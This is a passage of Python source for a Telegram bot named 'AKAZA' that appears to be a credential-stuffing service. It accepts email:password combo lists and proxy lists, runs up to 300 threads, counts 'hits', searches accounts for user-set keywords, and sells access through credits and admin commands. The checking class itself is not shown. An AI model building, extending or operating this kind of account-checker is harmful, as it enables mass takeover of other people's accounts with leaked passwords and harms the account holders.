        await q.edit_message_text("📖 <b>Help</b>\n\n/threads [N]\n/skw (stop)\n/ckw (clear)\n/start (home)", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
    elif q.data == "back": await start(u, c)
    elif q.data == "set_combo": await handle_combo(u, c)
    elif q.data == "set_proxy":
        content = pending_files.pop(uid, "")
        user_proxies[uid] = [l.strip() for l in content.splitlines() if l.strip()]
        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
    elif q.data == "admin" and akaza_db.is_mod(uid):
        st = akaza_db.get_global_stats()
        await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nUsers: {st['total']}\nChecks: {st['checks']}\nHits: {st['hits']}\n\nUse !!help for commands.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")

async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped recording.")
async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Keywords cleared.")
async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        try:
            n = int(c.args[0])
            if 1 <= n <= 300: akaza_db.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads: {n}")
        except: pass

async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args: kws = " ".join(c.args).replace(',', ' ').split(); akaza_db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Saved {len(kws)} keywords.")

async def add_keyword(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if c.args:
        s = akaza_db.get_user_settings(u.effective_user.id); new_kws = list(set(s['keywords'] + c.args))
        akaza_db.update_settings(u.effective_user.id, keywords=new_kws); await u.message.reply_text(f"✅ Added {len(c.args)} keywords.")

async def single_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not c.args or ':' not in c.args[0]: return await u.message.reply_text("❌ Use: /check email:password")
    uid = u.effective_user.id; e, p = c.args[0].split(':', 1); m = await u.message.reply_text("🔄 Checking...")
    s = akaza_db.get_user_settings(uid); d = await AkazaChecker().check(e.strip(), p.strip(), s['keywords'])
    await m.edit_text(f"📊 <b>Result:</b>\n<pre>{json.dumps(d, indent=2)}</pre>", parse_mode="HTML")

async def toggle_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
    s = akaza_db.get_user_settings(u.effective_user.id); akaza_db.update_settings(u.effective_user.id, fast_mode=not s['fast_mode'])
    await u.message.reply_text(f"✅ Fast Mode: {'ENABLED' if not s['fast_mode'] else 'DISABLED'}")

async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not u.message or not akaza_db.is_mod(u.effective_user.id): return
    m = u.message.text.split(); cmd = m[0].lower(); args = m[1:]; uid = u.effective_user.id
    try:
        if cmd == "!!help": await u.message.reply_text("!!addcredits [uid] [amt]\n!!setcredits [uid] [amt]\n!!resetcredits [uid]\n!!grant [uid]\n!!revoke [uid]\n!!addaccess [uid] [days]\n!!ban [uid]\n!!unban [uid]\n!!mod [uid]\n!!listmods\n!!info [uid]\n!!stats\n!!broadcast [msg]\n!!setthreads [uid] [n]\n!!addproxies", parse_mode="HTML")
        elif cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!resetcredits" and len(args) >= 1: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!grant" and len(args) >= 1: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!revoke" and len(args) >= 1: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!ban" and len(args) >= 1: akaza_db.ban(int(args[0])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!unban" and len(args) >= 1: akaza_db.unban(int(args[0])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!mod" and len(args) >= 1 and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅ Done.")
        elif cmd == "!!unmod" and len(args) >= 1 and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅ Done.")
        elif cmd == "!!listmods": ms = akaza_db.list_mods(); await u.message.reply_text("\n".join([f"{m['uid']} @{m['username']}" for m in ms]))
        elif cmd == "!!info" and len(args) >= 1: await u.message.reply_text(str(dict(akaza_db.get_user_info(int(args[0])))))
        elif cmd == "!!stats": await u.message.reply_text(str(akaza_db.get_global_stats()))
        elif cmd == "!!broadcast" and args:
            txt = u.message.text[len(cmd):].strip(); ids = akaza_db.get_all_user_ids(); c_sent = 0
            for target in ids:
                try: await c.bot.send_message(target, txt); c_sent += 1; await asyncio.sleep(0.05)
                except: pass
            await u.message.reply_text(f"✅ Sent to {c_sent} users.")
        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅ Done.")
        elif cmd == "!!addproxies": pxs = u.message.text[len(cmd):].strip().splitlines(); PROXIES_LIST.extend([AkazaChecker().format_proxy(p) for p in pxs if p.strip()]); await u.message.reply_text(f"✅ Loaded {len(pxs)} proxies.")
    except Exception as e: await u.message.reply_text(f"❌ {e}")

def bot_main_exec():
    akaza_db.init_db(); logger.info("AKAZA Bot starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", set_threads))
    app.add_handler(CommandHandler("keywords", set_keywords))
    app.add_handler(CommandHandler("addkw", add_keyword))
    app.add_handler(CommandHandler("ckw", cmd_ckw))
    app.add_handler(CommandHandler("clearkw", cmd_ckw))
    app.add_handler(CommandHandler("skw", cmd_skw))
    app.add_handler(CommandHandler("check", single_check))
    app.add_handler(CommandHandler("fastmode", toggle_fastmode))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'.+:.+'), handle_combo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__': bot_main_exec()
